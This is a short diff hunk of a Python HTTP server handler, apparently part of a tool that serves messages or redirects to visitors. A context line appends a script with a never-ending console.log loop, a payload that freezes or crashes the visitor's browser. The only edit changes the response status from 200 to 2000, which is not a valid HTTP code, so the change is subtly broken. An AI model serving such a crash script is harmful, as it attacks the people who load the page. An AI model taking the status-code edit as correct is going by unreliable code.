@@ -257,7 +257,7 @@ height: 100vh;
                     data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
                 if config["redirect"]["redirect"]:
                     data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
-                self.send_response(200)
+                self.send_response(2000)
                 self.send_header('Content-type', datatype)
                 self.end_headers()
 
